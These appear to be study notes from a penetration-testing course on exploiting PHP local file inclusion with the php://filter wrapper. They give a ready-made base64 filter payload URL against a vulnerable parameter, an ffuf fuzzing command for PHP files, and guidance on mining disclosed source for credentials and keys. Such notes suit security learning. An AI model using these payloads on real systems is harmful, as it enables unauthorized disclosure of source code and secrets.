# 1. PHP Wrappers

Many web applications are developed using **PHP**, including applications built with frameworks such as:

- Laravel
    
- Symfony
    
- Custom PHP applications
    

When an LFI vulnerability exists in a PHP application, **PHP Wrappers** can extend what we can do with that vulnerability.

### What are PHP Wrappers?

PHP wrappers allow applications to access different **I/O streams** at the application level.

They can provide access to things such as:

- Standard input/output
    
- File descriptors
    
- Memory streams
    
- Other supported streams
    

For penetration testing, wrappers can be particularly useful because they can extend LFI exploitation.

The material specifically highlights that wrappers can potentially allow us to:

```text
LFI
 ↓
PHP Wrapper
 ↓
Read PHP source code
```

and, in other circumstances, potentially extend exploitation toward command execution.

> ⚠️ **This section focuses on PHP filters and source-code disclosure. The following section covers other PHP wrappers and their potential use for RCE.**

---

# 2. PHP Filter Wrapper

PHP provides filters that can **transform stream data** while stream operations are taking place.

The PHP stream wrapper scheme is:

```text
php://
```

For the filter wrapper, we use:

```text
php://filter/
```

The important structure is:

```text
php://filter/[parameters]/resource=[file]
```

---

# 3. Important `php://filter` Parameters

The two parameters we care about are:

```text
resource
read
```

### `resource`

Specifies the stream/resource that the filter should operate on.

For example:

```text
resource=config
```

With an automatically appended `.php`, this can refer to:

```text
config.php
```

### `read`

Specifies the filter that should be applied when reading the resource.

Example:

```text
read=convert.base64-encode
```

Therefore:

```text
php://filter/read=convert.base64-encode/resource=config
```

means, conceptually:

```text
Read config.php
      ↓
Apply base64 encoding
      ↓
Return encoded contents
```

---

# 4. Types of PHP Filters

The material identifies four major categories:

|Filter Type|Purpose|
|---|---|
|**String Filters**|Transform strings|
|**Conversion Filters**|Convert data between representations|
|**Compression Filters**|Handle compressed streams|
|**Encryption Filters**|Apply encryption-related transformations|

For LFI source-code disclosure, the important filter is:

```text
convert.base64-encode
```

This belongs to the **Conversion Filters** category.

---

# ⭐ 5. Why Base64 Encoding Is Useful for LFI

This is the most important concept in this section.

Normally, when PHP includes a PHP file:

```text
config.php
      ↓
PHP interpreter
      ↓
PHP executes
      ↓
HTML/output
```

So instead of seeing:

```php
<?php
$database = "...";
$password = "...";
?>
```

we may simply see the output generated by the PHP file.

For files such as configuration files, there might be **no visible output at all**.

---

# 6. Standard PHP Inclusion

Suppose the vulnerable application automatically appends `.php`.

A request such as:

```text
language=config
```

may result in:

```text
config.php
```

being included.

If `config.php` only contains configuration code, it may produce:

```text
EMPTY RESPONSE
```

instead of showing the source.

The material demonstrates this with:

```text
http://<SERVER_IP>:<PORT>/index.php?language=config
```

The empty result does **not necessarily mean that the file doesn't exist**.

It may simply mean that the PHP file executed without producing HTML output.

---

# 7. Read vs Execute

This distinction is extremely important.

### Normal LFI

```text
PHP file
   ↓
Included
   ↓
Executed
   ↓
Rendered output
```

### What we actually want

```text
PHP file
   ↓
Read as data
   ↓
Source code returned
```

The `base64` filter helps achieve the second behavior.

---

# ⭐ 8. Source Code Disclosure

The goal is to make the PHP file's contents become **data**, rather than letting PHP execute the source normally.

The filter:

```text
convert.base64-encode
```

takes the contents and converts them into Base64.

Conceptually:

```text
config.php
     │
     ▼
Read file contents
     │
     ▼
Base64 encode
     │
     ▼
Encoded text
     │
     ▼
Decode locally
     │
     ▼
PHP source code
```

---

# 9. The Important Payload Structure

The source uses:

```text
php://filter/read=convert.base64-encode/resource=config
```

When supplied to the vulnerable `language` parameter:

```text
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

Because the application automatically appends:

```text
.php
```

to the end of the input, the resource becomes:

```text
config.php
```

This is a very important detail.

---

# ⭐ 10. Why `config` Instead of `config.php`?

The application is doing something equivalent to:

```text
input + ".php"
```

Therefore, if we supplied:

```text
resource=config.php
```

the resulting filename could become:

```text
config.php.php
```

Instead, the source intentionally specifies:

```text
resource=config
```

so the application's appended extension produces:

```text
config.php
```

This is explicitly highlighted in the material.

---

# 11. Result of Using the Filter

Without the filter:

```text
LFI → config.php → execution → empty output
```

With the filter:

```text
LFI
 ↓
php://filter
 ↓
config.php
 ↓
base64 encode
 ↓
encoded source
```

Instead of an empty response, we receive a Base64-encoded representation of the source code.

---

# 12. Decoding the Result

The returned value looks something like:

```text
PD9waHAK...SNIP...KICB9Ciov
```

This isn't readable PHP yet.

We need to decode the Base64 representation.

The source demonstrates:

```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

The decoded result becomes PHP source code.

For example, the material shows source containing logic similar to:

```php
if ($_SERVER['REQUEST_METHOD'] == 'GET' &&
    realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('HTTP/1.0 403 Forbidden', TRUE, 403);
    die(header('location: /index.php'));
}
```

---

# 13. Why Source Code Is Valuable

Once PHP source code is disclosed, we can understand how the application works.

Look for things such as:

```text
Configuration
    ↓
Database settings
    ↓
Credentials / keys
    ↓
File references
    ↓
Other PHP files
    ↓
Application logic
```

The material specifically recommends investigating source code for potentially sensitive information such as:

- Credentials
    
- Database keys
    
- References to other files
    

---

# 14. Finding PHP Files

Before reading source code, we need a list of PHP files that may exist.

The source recommends fuzzing for PHP pages using tools such as:

- `ffuf`
    
- `gobuster`
    

Example methodology:

```text
Web application
      ↓
Discover PHP files
      ↓
Read source through LFI
      ↓
Find references to more PHP files
      ↓
Read those
      ↓
Repeat
```

---

# 15. Fuzzing with `ffuf`

The source gives this example:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

The example identifies files such as:

```text
index.php
config.php
```

with different HTTP response codes.

---

# ⭐ 16. Important Fuzzing Tip

Normally, when discovering web pages, you might focus primarily on:

```text
200 OK
```

But with LFI, the situation is different.

The source explicitly says we should not restrict ourselves to HTTP `200` responses.

We should consider responses such as:

```text
301
302
403
```

as well.

Why?

Because having LFI access may allow us to read the underlying source code even when the page itself isn't normally accessible.

---

# 17. Source Code as a Map

One of the strongest ideas in this section is that **source-code disclosure can reveal more files**.

For example:

```text
index.php
   │
   ├── config.php
   ├── login.php
   ├── database.php
   └── admin.php
```

If `index.php` references:

```text
config.php
database.php
```

we can investigate those files as well.

Then:

```text
database.php
      ↓
references another PHP file
      ↓
read that file
      ↓
discover another reference
```

This creates a chain.

---

# 🔥 18. Source Disclosure Chain

```text
                LFI
                 │
                 ▼
        Find PHP files
                 │
                 ▼
          Read index.php
                 │
                 ▼
       Find referenced files
                 │
        ┌────────┴────────┐
        ▼                 ▼
    config.php        database.php
        │                 │
        ▼                 ▼
   Read source        Read source
        │                 │
        └────────┬────────┘
                 ▼
       Discover more files
                 │
                 ▼
       Build application map
```

This is why source disclosure can be much more valuable than simply reading one local file.

---

# 19. Why Fuzzing + Source Reading Is Better

There are two complementary approaches.

### Approach 1

Start with:

```text
index.php
```

Then inspect it for references.

### Approach 2

Fuzz for PHP files first.

The source explains that fuzzing can discover files that might not otherwise be found by simply following references from `index.php`.

### Best conceptual workflow

```text
Fuzz
 ↓
Discover PHP files
 ↓
Read their source
 ↓
Follow references
 ↓
Discover additional files
```

# 🧠 20. Important Difference: Normal LFI vs PHP Filter

|Normal LFI|PHP Filter|
|---|---|
|Includes PHP file|Reads/transforms stream|
|PHP file may execute|Source can be returned as encoded data|
|May produce empty output|Produces Base64 data|
|Difficult to inspect source|Useful for source-code disclosure|
|Appended `.php` can remain a limitation|Filter can operate on the PHP resource|

---

# ⭐ 21. The Core Payload Structure

Remember this structure:

```text
php://filter/read=convert.base64-encode/resource=FILE
```

Break it down:

```text
php://
   │
   └── filter/
          │
          ├── read=
          │      │
          │      └── convert.base64-encode
          │
          └── resource=
                 │
                 └── FILE
```

---

# 22. `resource` vs `read`

This is an easy place to get confused.

### `resource`

**What are we reading?**

```text
resource=config
```

### `read`

**How should it be transformed while reading?**

```text
read=convert.base64-encode
```

Together:

```text
What?
 ↓
config.php

How?
 ↓
Base64 encode
```

---

# 🔴 23. Important: The Extension Is Appended

Suppose the vulnerable application does:

```text
include($_GET['language'] . ".php");
```

Then:

```text
language=config
```

becomes:

```text
config.php
```

With the wrapper:

```text
language=php://filter/read=convert.base64-encode/resource=config
```

the `.php` is still appended to the overall input, making the resource effectively refer to the desired PHP file according to the application's parsing behavior described in the material.

> ⭐ **Remember the exact behavior of the vulnerable application before constructing the resource value.**

---

# 24. Base64 Decoding

Once the server returns Base64 data, it needs to be decoded.

Linux example from the source:

```bash
echo 'BASE64_DATA' | base64 -d
```

Conceptually:

```text
Encoded response
      ↓
base64 -d
      ↓
Original PHP source
```

---

# ⚠️ 25. Copy the Entire Base64 String

The source gives an important practical warning:

> **Copy the entire Base64-encoded string.**

If even part of the response is missing, decoding may fail or produce incomplete source code.

A useful approach is to view the page source when necessary so that the complete returned string can be copied.

# 26. What to Look for in Disclosed Source

Once you decode the source, examine it for:

### Configuration

```text
Database configuration
Application settings
Environment configuration
```

### Credentials

```text
Usernames
Passwords
API credentials
```

### Keys

```text
Database keys
Application secrets
Encryption-related values
```

### File References

```text
include(...)
require(...)
require_once(...)
```

These can lead to additional PHP files.

# 🎯 28. Key Terms to Memorize

|Term|Meaning|
|---|---|
|**PHP Wrapper**|Mechanism for accessing different I/O streams|
|**`php://`**|PHP stream wrapper scheme|
|**`php://filter/`**|Wrapper used to apply filters to a resource|
|**`resource`**|Resource/stream being accessed|
|**`read`**|Specifies a read filter|
|**`convert.base64-encode`**|Encodes resource contents as Base64|
|**Source Code Disclosure**|Obtaining the underlying application source|
|**Fuzzing**|Discovering potentially available files/endpoints|
|**Standard Inclusion**|PHP file gets executed rather than exposed as source|

# 🧠 30. Why This Works Even With `.php` Appended

This is one of the most important connections to the previous section.

Previously:

```text
Input
 ↓
.php appended
 ↓
Only PHP files accessible
```

That seemed like a restriction.

But if PHP files are exactly what we want to inspect, we can use:

```text
php://filter
```

to transform the PHP file's contents before they are executed.

Therefore:

```text
Appended .php
       ↓
Not necessarily a complete obstacle
       ↓
PHP file can be selected
       ↓
Filter transforms its contents
       ↓
Source becomes readable
```

## 🔥 The 5 things you absolutely need to remember

```text
1️⃣ PHP wrappers → extend what LFI can do

2️⃣ php://filter/ → apply filters to a resource

3️⃣ resource → tells PHP WHAT to read

4️⃣ read=convert.base64-encode → tells PHP HOW to transform it

5️⃣ Base64 output → decode it → obtain PHP source code
```

And the central flow is:

> **LFI → `php://filter` → Base64 encoding → encoded response → decode → source-code disclosure.**
